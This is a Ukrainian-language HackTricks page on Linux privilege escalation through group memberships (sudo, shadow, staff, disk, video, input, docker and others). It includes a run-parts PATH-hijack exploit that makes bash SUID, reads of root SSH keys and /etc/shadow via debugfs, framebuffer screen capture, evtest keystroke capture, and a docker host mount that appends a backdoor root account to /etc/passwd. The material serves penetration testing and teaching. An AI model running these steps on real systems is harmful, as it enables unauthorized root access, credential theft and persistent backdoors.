# Цікаві групи — Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Групи Sudo/Admin

### **PE — Метод 1**

**Іноді** політика **/etc/sudoers** системи (або файл, включений до неї) містить такі записи:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Це означає, що будь-який користувач, який відповідає одному з цих записів, може виконувати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, достатньо виконати**:

```
sudo su
```

Якщо `sudo -l` дозволяє обмежений виклик `adduser` лише з іменем користувача, перевірте, чи створюється група з такою самою назвою, якщо її ще немає. Новий обліковий запис у цій групі може отримати привілеї, якщо чинна політика sudoers уже надає їх `%group`; перш ніж вважати це шляхом до підвищення привілеїв, перевірте і поведінку створення групи, і правило для групи. Створення облікового запису змінює систему, тому спершу перевірте політику.

### PE - Method 2

Знайдіть усі бінарні файли suid і перевірте, чи є серед них **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Якщо **pkexec є бінарним файлом SUID**, він може виконати програму від імені іншого користувача лише тоді, коли polkit авторизує запитану дію; сам біт SUID не гарантує доступу root. Перевірте встановлену політику та авторизацію цільового сеансу, а не припускайте, що членства в групі **sudo** або **admin** достатньо.<sup>[[4]](#references)[[5]](#references)</sup>

Для окремого шляху [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) спершу перевірте, що `pkexec` є виконуваним файлом SUID, власником якого є **root**. Встановлений бінарний файл без цього біта не є локальним підвищенням привілеїв через SUID, описаним у рекомендації з безпеки. Рядок версії upstream — лише зачіпка: дистрибутиви можуть [переносити виправлення в старіші версії пакетів](https://ubuntu.com/security/CVE-2021-4034), тому перш ніж вважати систему вразливою, перевірте встановлений пакет постачальника та засоби пом'якшення наслідків.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) — це інший шлях у polkit: гонка авторизації D-Bus, а не вада SUID у `pkexec`. Перевірте встановлений пакет polkit від постачальника та те, чи може доступна привілейована дія D-Bus внести корисну зміну; для створення облікового запису також потрібна відповідна служба, як-от AccountsService, а доступ нової групи до sudo залежить від чинної політики sudo. Повідомлена версія polkit або сама наявність встановленої служби — лише підстава для перевірки, особливо з огляду на те, що постачальники можуть [переносити виправлення](https://access.redhat.com/security/cve/cve-2021-3560). Пасивне збирання даних не повинно запускати гонку.

У дистрибутивах, де досі використовується старий бекенд Local Authority, перевірте правила груп за допомогою:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Назви відповідних груп і типові налаштування залежать від дистрибутива; група корисна тут лише тоді, коли її вказано в локальній політиці.<sup>[[5]](#references)</sup>

Щоб **стати root, можна виконати**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Якщо спробувати запустити **pkexec** і отримати цю **помилку**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

У SSH-сеансі без зареєстрованого агента автентифікації `pkexec` може завершитися помилкою, навіть якщо політика в інших умовах дозволила б цю дію; у документації polkit `pkttyagent` зазначено як текстовий агент автентифікації для сеансів без робочого столу. Точна поведінка залежить від версії та дистрибутива, тож перевірте локальну політику й налаштування агента. Для деяких версій NixOS повідомляють про обхідний спосіб із використанням **2 різних SSH-сеансів**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL, який забороняє одному обліковому запису доступ до `su`, поширюється на цей виконуваний файл, а не на всі способи виконати дію, дозволену адміністратору. Якщо облікові дані адміністратора стали доступними незалежно від цього, з’ясуйте, чи дозволяє чинна політика polkit окрему дію, наприклад запуск тимчасової системної служби через `systemd-run`, який обліковий запис приймає агент автентифікації та який обліковий запис використовуватиме запущена служба. [Polkit розрізняє автентифікацію як власника сеансу та як адміністратора](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), а [systemd-run може запитувати тимчасову службу в системного менеджера](https://systemd.io/CONTROL_GROUP_INTERFACE/). Запис у журналі команд, встановлена команда чи доступний для читання файл політики самі по собі не підтверджують наявність дозволу або дійсність облікових даних; пасивна перевірка не повинна надсилати облікові дані чи запускати юніт.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Група wheel

Іноді політика sudoers також може містити такий запис:

```
%wheel	ALL=(ALL:ALL) ALL
```

Це означає, що будь-який користувач, який відповідає цьому запису, може виконати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, достатньо виконати**:

```
sudo su
```

## Група shadow

У системах, де дозволи надають таку можливість, користувачі з групи **shadow** можуть **читати** **/etc/shadow**; перевірте фактичний режим доступу та ACL цільової системи:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Отже, прочитайте файл і спробуйте **зламати кілька хешів**.

Коротке уточнення щодо стану блокування під час аналізу хешів:
- Записи з `!` або `*` зазвичай не дають змоги виконувати інтерактивний вхід за паролем.
- `!hash` означає, що пароль заблоковано; решта символів — це вміст поля пароля до блокування.
- Поле, що містить `*`, не є дійсним хешем `crypt(3)` і запобігає входу в UNIX за паролем; не робіть висновків на його основі про те, чи було раніше задано пароль.
Це корисно для класифікації облікових записів, навіть якщо прямий вхід заблоковано.<sup>[[6]](#references)</sup>

## Група Staff

**staff**: Дає користувачам змогу додавати локальні зміни до системи (`/usr/local`) без прав root (зауважте, що виконувані файли в `/usr/local/bin` входять до змінної PATH усіх користувачів і можуть «перекривати» однойменні виконувані файли в `/bin` і `/usr/bin`). Порівняйте з групою «adm», яка більше стосується моніторингу/безпеки.<sup>[[2]](#references)[[7]](#references)</sup>

У конфігураціях Debian, де `/usr/local/bin` стоїть у `PATH` перед `/usr/bin` (як у прикладах нижче), команда без зазначеного шляху спочатку запускає копію з `/usr/local/bin`; перевірте фактичне значення `PATH` на цільовій системі.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Якщо привілейований процес шукає команду без зазначення шляху в каталозі `/usr/local/bin`, доступному для запису, підміна цієї команди може призвести до її виконання з привілеями процесу; перед тестуванням перевірте фактичний шлях і умови запуску.

У системах Ubuntu `pam_motd` під час входу запускає виконувані скрипти через `run-parts --lsbsysinit` від імені root; завдання cron також можуть використовувати `run-parts`, але це залежить від дистрибутива та конфігурації.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Під час нового входу через SSH `pspy` може допомогти підтвердити, чи цей шлях справді викликається на цільовій системі; він може спостерігати за командними рядками процесів без root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Група disk

Членство в групі **disk** може надати прямий доступ до блокових пристроїв і часто **майже еквівалентне доступу root**; Debian описує його як здебільшого еквівалентний root, але перевірте фактичні дозволи на пристрої та структуру сховища на цільовій системі.<sup>[[7]](#references)</sup>

Серед типових шляхів до пристроїв — `/dev/sd*`, але в NVMe та інших конфігураціях сховищ використовуються інші назви.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` працює з файловими системами ext2/ext3/ext4; шляхи на кшталт `/root` і `/etc/shadow`, наведені вище, — це файли у відкритій файловій системі, тоді як другий аргумент `dump` — це шлях виведення у файловій системі хоста.<sup>[[8]](#references)</sup> Наприклад, ця команда витягує `/tmp/asd1.txt` з відкритої файлової системи до `/tmp/asd2.txt` у файловій системі хоста:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Параметр `-w` відкриває файлову систему для читання й запису, а команда `write` копіює файл із хост-системи у відкриту файлову систему. Не використовуйте її для змін у змонтованій файловій системі, що працює, оскільки пряме редагування може пошкодити її; за можливості працюйте з офлайн-образом.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Група Video

За допомогою команди `w` можна дізнатися, **хто увійшов у систему**, і вона покаже приблизно такий результат.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Запис **tty1** позначає першу віртуальну консоль Linux; сам по собі він не доводить, що користувач фізично присутній за машиною, особливо в контейнерах або інших середовищах.<sup>[[21]](#references)</sup>

У системах, де доступний для читання пристрій фреймбуфера, членство в групі **video** може надавати доступ до цього пристрою. В інтерфейсі фреймбуфера Linux `/dev/fb0` описано як доступний для читання пристрій пам’яті, дані з якого можна скопіювати для знімка екрана; шлях `/sys/class/graphics/fb0/virtual_size` доступний лише там, де присутній цей атрибут fbdev у sysfs, тому спершу перевірте цільову систему.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Якщо встановлена версія **GIMP** має імпортер необроблених даних, відкрийте **`screen.raw`** за допомогою цього імпортера; підтримка й елементи керування залежать від версії та плагіна.<sup>[[22]](#references)</sup>

![Група дисків — група відео: щоб відкрити raw-зображення, можна скористатися GIMP: виберіть файл screen.raw і тип файлу Raw image data](<../../../images/image (463).png>)

Установіть ширину й висоту зображення відповідно до геометрії framebuffer; спробуйте доступні формати пікселів/типи зображень, доки вміст не стане розбірливим.<sup>[[9]](#references)</sup>

![Група дисків — група відео: змініть ширину й висоту відповідно до параметрів екрана та перевірте різні типи зображень (виберіть той, на якому екран видно найкраще)](<../../../images/image (317).png>)

## Група input

У системах, де група `input` має доступ на читання до пристроїв подій клавіатури, її учасник може спостерігати за необробленими натисканнями клавіш із такого пристрою. Спочатку перевірте фактичні права доступу та ACL: активне локальне робоче місце може отримувати доступ через ACL `uaccess`, а сама назва групи не гарантує доступу.<sup>[[23]](#references)[[24]](#references)</sup>

Знайдіть обробник клавіатури `eventX`, переконайтеся, що поточний обліковий запис може читати його вузол, а потім протягом короткого авторизованого тесту відстежуйте введення за допомогою `evtest`. **Не** використовуйте `--grab`: ця опція отримує ексклюзивний доступ і може завадити іншим програмам отримувати введення.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` повідомляє коди клавіш, а не готовий текст: значення `1` означає натискання, `0` — відпускання, а `2` — повтор. Це може розкрити клавіші, введені під час іншого сеансу за допомогою цієї фізичної клавіатури, зокрема облікові дані, але саме по собі не надає root-доступу. Композитор робочого столу не скасовує доступ до вузла raw-пристрою.<sup>[[25]](#references)</sup>

Докладніше про перевірки ідентичності та сеансів див. у розділі [користувачі та сеанси](../user-and-session-triage.md).

## Група root

Членство в групі **root** не надає UID root, але файли, що належать `root` і доступні для запису групі, усе ще можуть бути цікавими, якщо привілейовані служби чи бібліотеки використовують їх. Перш ніж вважати це шляхом до підвищення привілеїв, перевірте фактичні дозволи файлу та спосіб його використання.

**Перевірте, які файли можуть змінювати учасники групи root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Група Docker

Членство в групі `docker` на стандартних rootful-інсталяціях надає доступ до демона Docker на рівні root. Оскільки bind mounts за замовчуванням доступні для читання й запису, користувач, який може керувати цим демоном, може змонтувати `/` хоста в контейнер і змінювати файли хоста; фактично це надає root-доступ до хоста.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Членство в групі може не збігатися між `/etc/group`, `/etc/gshadow` і токеном поточного процесу. Якщо користувач відсутній у виводі `id -nG`, але команда `newgrp docker` виконується успішно, перевірте групу, яку показує `id` у новій оболонці, і з’ясуйте, чи справді сокет Docker доступний для запису та чи обслуговує він rootful-демон. Сама назва групи не підтверджує контроль над хостом. Обмежте автоматизовану перевірку через `newgrp` за часом, щоб запит пароля не затримав збір даних.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Насамкінець, якщо жодна з попередніх пропозицій вам не до вподоби або вони з певних причин не працюють (firewall для Docker API?), ви завжди можете спробувати **запустити привілейований контейнер і втекти з нього**, як пояснено тут:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Якщо у вас є права на запис до сокета Docker, прочитайте [**цю публікацію про підвищення привілеїв через зловживання сокетом Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Група lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Група Adm

Зазвичай **учасники** групи **`adm`** мають дозвіл **читати файли журналів**, розташовані в _/var/log/_.\
Тому, якщо ви скомпрометували користувача з цієї групи, обов’язково **перегляньте журнали**.<sup>[[7]](#references)</sup>

## Групи Backup / Operator / lp / Mail

Ці групи мають значення, що залежать від служб і дистрибутива. У Debian для `backup` задокументовано делеговане резервне копіювання та відновлення, `lp` — для служб друку, а `mail` — для `/var/mail`, тож перш ніж вважати членство в цих групах шляхом до підвищення привілеїв, перевірте локальні дозволи.<sup>[[7]](#references)</sup>

Часто вони є векторами **виявлення облікових даних**, а не прямими векторами отримання root:
- **backup**: може надавати доступ до архівів із конфігураціями, ключами, дампами БД або токенами.
- **operator**: специфічний для платформи операційний доступ, через який можуть витекти чутливі дані середовища виконання.
- **lp**: черги друку та спули можуть містити вміст документів.
- **mail**: спули пошти можуть розкривати посилання для скидання пароля, OTP і внутрішні облікові дані.

Вважайте членство в цих групах важливою знахідкою, що свідчить про витік даних, і переходьте до перевірки повторного використання паролів і токенів.

## Група Auth

В OpenBSD, якщо налаштовано S/Key, файл `/etc/skey` належить `root:auth`, а для доступу до його записів потрібна група `auth`; записи YubiKey зберігаються в `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Вразлива конфігурація OpenBSD 6.6 із увімкненим S/Key або YubiKey дозволяла локальним користувачам із привілеями `auth` отримати root; у рекомендації з безпеки Qualys описано необхідні умови та ланцюжок експлуатації, а пов’язаний PoC реалізує цей сценарій.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [Автентифікація pkexec/pkttyagent без сеансу GUI (проблема NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Системні групи — Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — сторінки посібника Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — довідковий посібник polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — довідковий посібник polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Посібник із захисту Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — сторінка посібника Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Пристрій кадрового буфера — документація ядра Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — сторінки посібника Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — сторінки посібника Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — стеження за процесами Linux без привілеїв](https://github.com/DominicBreuker/pspy)
- [13] [Безпека Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Керування Docker від імені користувача без root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Запуск контейнерів — документація Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — сторінки посібника OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — сторінки посібника OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Уразливості автентифікації в OpenBSD — рекомендація з безпеки Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC локальної експлуатації](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Зарезервовані пристрої Linux (версія 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Імпорт та експорт зображень — документація GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Рекомендації щодо дозволів пристрою beep — вихідний код Debian](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — посібник systemd](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Коди подій введення — документація ядра Linux](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — сторінки посібника Debian](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
